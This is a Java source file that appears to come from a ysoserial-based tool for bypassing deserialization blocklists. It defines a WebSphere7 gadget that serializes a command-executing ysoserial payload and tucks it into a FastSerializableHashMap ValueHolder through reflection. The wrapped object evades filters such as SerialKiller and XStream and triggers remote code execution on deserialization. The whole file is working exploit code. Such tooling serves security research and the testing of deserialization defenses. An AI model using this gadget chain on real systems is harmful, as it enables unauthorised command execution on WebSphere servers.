package serialkiller.bypass;

import com.ibm.wsspi.util.FastSerializableHashMap;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;
import serialkiller.util.Serializables;
import java.lang.reflect.Constructor;
import java.util.*;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "websphere"} )
public class WebSphere7 implements BypassGadget {

    public Object wrapPayload(String command, Class payload_class) throws Exception {

        Object payload = ((ObjectPayload) payload_class.getConstructor().newInstance()).getObject(command);
        byte[] payload_bytes = Serializables.serialize(payload);

        FastSerializableHashMap fastSerializableHashMap = new FastSerializableHashMap();
        Constructor ctor = Class.forName("com.ibm.wsspi.util.FastSerializableHashMap$ValueHolder").getDeclaredConstructor();
        ctor.setAccessible(true);
        Object valueHolder = ctor.newInstance();
        Reflections.setFieldValue(valueHolder, "_valueBytes", payload_bytes);
        HashMap map = Gadgets.makeMap(valueHolder, valueHolder);

        return map;

    }

    public boolean bypassXStream() { return true; }
    public boolean skipTest() { return false; }
}
